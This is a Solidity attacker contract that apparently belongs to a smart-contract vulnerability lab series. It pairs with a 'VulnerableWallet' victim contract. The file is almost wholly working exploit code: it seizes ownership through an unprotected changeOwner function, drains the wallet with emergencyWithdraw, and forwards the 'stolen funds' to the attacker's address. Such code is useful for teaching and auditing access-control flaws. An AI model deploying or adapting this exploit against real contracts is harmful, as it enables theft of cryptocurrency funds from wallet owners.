// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SC01_AccessControl_Victim.sol";

contract AccessControlAttacker {
    VulnerableWallet public vulnerableWallet;
    address public originalOwner;
    address public attackerAddress;

    constructor(address payable _vulnerableWalletAddress) {
        vulnerableWallet = VulnerableWallet(_vulnerableWalletAddress);
        originalOwner = vulnerableWallet.owner();
        attackerAddress = msg.sender;
    }

    // Attack 1: Take ownership of the contract
    function attackChangeOwner() public {
        vulnerableWallet.changeOwner(address(this));
    }

    // Attack 2: Drain all funds using emergencyWithdraw
    function attackEmergencyWithdraw() public {
        vulnerableWallet.emergencyWithdraw();
    }

    // Combined attack: Take ownership and drain funds
    function fullAttack() public {
        // Step 1: Take ownership
        vulnerableWallet.changeOwner(address(this));
        
        // Step 2: Drain all funds
        vulnerableWallet.emergencyWithdraw();
    }

    // Function to receive Ether
    receive() external payable {}

    // Function to withdraw stolen funds to attacker's address
    function withdrawStolenFunds() public {
        require(msg.sender == attackerAddress, "Only attacker can withdraw");
        uint amount = address(this).balance;
        (bool success, ) = payable(attackerAddress).call{value: amount}("");
        require(success, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getWalletBalance() public view returns (uint) {
        return address(vulnerableWallet).balance;
    }
}
